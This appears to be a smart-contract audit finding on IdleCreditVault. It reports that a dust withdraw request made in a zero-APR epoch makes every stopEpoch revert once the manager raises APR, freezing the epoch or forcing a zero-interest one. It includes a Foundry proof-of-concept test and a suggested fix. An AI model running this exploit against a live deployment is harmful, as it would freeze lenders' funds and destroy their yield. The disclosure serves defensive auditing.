### Title
Dust APR0 withdraw request blocks any APR change and freezes `stopEpoch`, forcing a zero-interest epoch — (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.prepareStopEpochWithApr0` reverts with `NotAllowed` whenever `apr0TotalPrincipal != 0` and `unscaledApr != 0`. Any KYC-passed lender can create a non-zero `apr0TotalPrincipal` with a dust-sized `requestWithdraw` during a zero-APR epoch. Once the manager later sets a non-zero APR for the next epoch, every `stopEpoch` call reverts until APR is set back to 0, freezing the epoch state machine and forcing all LPs through an unintended zero-interest epoch.

### Finding Description
- `requestWithdraw` routes to `_requestWithdrawApr0` whenever `unscaledApr == 0`, which increments `apr0TotalPrincipal` by `_amount` with no minimum (`IdleCreditVault.sol:285-286, 567-577`).
- At epoch end, `IdleCDOEpochVariant._stopEpoch` calls `prepareStopEpochWithApr0`, which reverts if `apr0TotalPrincipal != 0 && unscaledApr != 0` (`IdleCreditVault.sol:502-508`).
- `apr0TotalPrincipal` is only cleared inside that same function (line 540), so there is no other path to unblock the vault: the manager cannot remove the attacker's pending request, cannot complete `stopEpoch`, and cannot rotate the epoch while a non-zero APR is configured.
- The only escape is for the manager to set APR back to 0 and run a full extra zero-interest epoch (or leave the epoch un-stoppable, freezing all pending withdraws past `epochEndDate`).

### Impact Explanation
A single dust withdraw request (cost: one minimal tranche position, burned into a receipt) lets an unprivileged attacker either (a) temporarily freeze the running epoch — no `stopEpoch`, no claims, no new epoch — or (b) coerce an entire additional epoch at 0% APR, destroying the expected yield for all AA/BB depositors for a full `epochDuration` (quantified loss = `expectedEpochInterest` for that epoch). This matches the CVE bug class: a low-privilege network attacker degrading availability of a core service.

### Likelihood Explanation
Requirements: pool in a zero-APR epoch (`unscaledApr == 0`, e.g. AYS disabled or APR0 mode), attacker holds any tranche balance (KYC'd lender). The trigger is an ordinary honest manager action — raising APR — which is exactly the normal config change after an APR0 promotional epoch. No privileged collusion, no oracle, no default needed.

### Recommendation
In `prepareStopEpochWithApr0`, do not revert when `unscaledApr != 0`: either settle the APR0 bucket at zero interest (emit `apr0RateByEpoch[epochNumber] = 0` and clear `apr0TotalPrincipal`), or apply a minimum request amount / pro-rata guard so dust requests cannot wedge the epoch transition.

### Proof of Concept
```solidity
// Foundry fork test, extends test/foundry/IdleCreditVault.t.sol harness
function testPocApr0DustFreezesStopEpoch() external {
    // APR0 mode
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(0, 0);

    address attacker = makeAddr('attacker');
    _depositWithUser(attacker, 1e6, true); // dust position, KYC'd lender

    _startEpochAndCheckPrices(0);

    // Attacker files a dust withdraw request -> apr0TotalPrincipal > 0
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(1, address(AAtranche));
    assertGt(IdleCreditVault(address(strategy)).apr0TotalPrincipal(), 0);

    // Honest manager raises APR for next epoch during buffer/running phase
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(initialProvidedApr, initialProvidedApr);

    // Epoch ends; every stopEpoch now reverts -> funds frozen
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    cdoEpoch.stopEpoch(initialProvidedApr, 0);

    // Only escape: manager forced back to 0% APR for a whole extra epoch
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(0, 0);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0); // succeeds, all LPs earned 0 for epochDuration
}
```

Key code paths: `requestWithdraw`/`_requestWithdrawApr0` and the revert in `prepareStopEpochWithApr0` [1](#0-0) [2](#0-1) [3](#0-2)  and the call from `_stopEpoch` [4](#0-3) .

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L285-294)
```text
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L502-508)
```text
    if (_principal == 0) {
      return (_expInterest, _adjPendingWithdrawFees);
    }
    // APR0 principal is only valid while APR is 0 for that request lifecycle.
    if (unscaledApr != 0) {
      revert NotAllowed();
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L567-577)
```text
  function _requestWithdrawApr0(uint256 _amount, address _user) internal {
    // Settle any previous APR0 request first, then start/update current epoch bucket.
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    if (_apr0User.principal == 0) {
      _apr0User.principalEpoch = epochNumber;
    }
    _apr0User.principal += _amount;
    // Epoch-level APR0 principal used only to compute stopEpoch APR0 pro-rata interest.
    apr0TotalPrincipal += _amount;
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L330-353)
```text
  function _stopEpoch(uint256 _newApr, uint256 _interest, uint256 _lossAmount) private {
    _checkOnlyOwnerOrManager();
    bool _isRequestingAllFunds = _interest == 1;
    _checkProgrammableBorrowerMode();

    IdleCreditVault _strategy = IdleCreditVault(strategy);
    uint256 _pendingWithdrawFees = pendingWithdrawFees;

    _checkNotAllowed(
      // Check that epoch is running
      !isEpochRunning || 
      // Check that end date is passed
      block.timestamp < epochEndDate || 
      // Check that there are no pending instant withdraws, ie `getInstantWithdrawFunds` was called
      // before closing the epoch
      _pendingInstant() != 0 ||
      // Check that overridden interest, if passed (ie > 1), is greater than pending withdraw fees and the apr is 0 
      // otherwise withdrawal requests may not be fullfilled as they consider also the interest gained in the next epoch 
      (_interest > 1 && (_interest < _pendingWithdrawFees || _newApr != 0)) ||
      // Closing already recalls all principal, so applying a separate loss burn would strand returned cash.
      (_isRequestingAllFunds && _lossAmount != 0)
    );

    uint256 _totBorrowed = _beforeStopEpoch(_isRequestingAllFunds);
```
